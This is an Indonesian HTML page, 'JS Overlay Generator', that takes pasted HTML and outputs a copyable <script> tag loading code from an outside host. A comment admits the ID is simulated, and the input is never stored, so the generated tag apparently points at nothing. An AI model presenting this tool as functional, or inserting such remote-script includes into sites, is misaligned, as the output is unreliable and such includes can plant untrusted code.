<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JS Overlay Generator - Alpin Developer</title>
    <style>
        /* Reset CSS */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        /* Background Modern */
        body {
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            overflow: hidden;
            position: relative;
            color: white;
        }

        /* Kotak Container */
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            backdrop-filter: blur(10px);
            box-shadow: 0px 0px 20px rgba(255, 255, 255, 0.2);
            text-align: center;
            width: 90%;
            max-width: 500px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 15px;
        }

        textarea {
            width: 100%;
            height: 120px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            resize: none;
        }

        button {
            background: #ff5722;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            margin-top: 10px;
            border-radius: 5px;
            transition: 0.3s;
        }

        button:hover {
            background: #e64a19;
        }

        .output {
            margin-top: 20px;
            padding: 10px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 5px;
            text-align: left;
            word-wrap: break-word;
            color: #e0e0e0;
            font-family: monospace;
        }

        /* Efek Salju */
        .snowflake {
            position: absolute;
            top: -10px;
            color: white;
            font-size: 12px;
            opacity: 0.8;
            user-select: none;
            animation: fall linear infinite;
        }

        @keyframes fall {
            to {
                transform: translateY(100vh);
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>JS Overlay Generator - Alpin Developer</h1>
        <textarea id="htmlInput" placeholder="Masukkan kode HTML di sini..."></textarea>
        <br>
        <button onclick="generateJS()">Generate Overlay</button>
        <button onclick="copyJS()">Copy Code</button>
        <div class="output" id="jsOutput"></div>
    </div>

    <audio id="clickSound">
        <source src="https://files.catbox.moe/lax7ur.mp3" type="audio/mpeg">
    </audio>

    <!-- Efek Salju -->
    <script>
        function createSnowflakes() {
            const snowflakeCount = 50;
            for (let i = 0; i < snowflakeCount; i++) {
                let snowflake = document.createElement("div");
                snowflake.innerHTML = "&#10052;";
                snowflake.classList.add("snowflake");
                document.body.appendChild(snowflake);

                let size = Math.random() * 10 + 5;
                let position = Math.random() * 100;
                let duration = Math.random() * 5 + 5;

                snowflake.style.left = position + "vw";
                snowflake.style.fontSize = size + "px";
                snowflake.style.animationDuration = duration + "s";
                snowflake.style.animationDelay = Math.random() * 5 + "s";
            }
        }
        createSnowflakes();

        function generateJS() {
            let htmlCode = document.getElementById("htmlInput").value;
            if (htmlCode.trim() === "") {
                alert("Masukkan kode HTML terlebih dahulu!");
                return;
            }

            // Simulasi ID unik untuk file yang di-generate
            let uniqueID = Math.random().toString(36).substring(2, 10).toUpperCase();
            let shortOverlay = `<script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/${uniqueID}"><\/script>`;

            document.getElementById("jsOutput").innerText = shortOverlay;

            playClickSound();
        }

        function copyJS() {
            let outputText = document.getElementById("jsOutput").innerText;
            if (outputText.trim() === "") {
                alert("Tidak ada kode yang bisa disalin!");
                return;
            }

            navigator.clipboard.writeText(outputText);
            alert("Kode telah disalin!");
            playClickSound();
        }

        function playClickSound() {
            let sound = document.getElementById("clickSound");
            sound.play();
        }
    </script>

</body>
</html>
